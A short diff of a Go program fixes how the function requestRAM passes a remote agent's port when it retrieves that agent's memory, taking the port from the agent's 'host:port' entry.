@@ -176,7 +176,7 @@ func requestRAM(port string) {
 				fmt.Println("[+] Requesting RAM.")
 				sendMessage(msg, agentsList[inpt])
 
-				retreiveRAM(port, strings.Split(agentsList[inpt], ":")[0])
+				retreiveRAM(strings.Split(agentsList[inpt], ":")[1], strings.Split(agentsList[inpt], ":")[0])
 				break
 			} else {
 				fmt.Println("[!] Invalid agent index!")
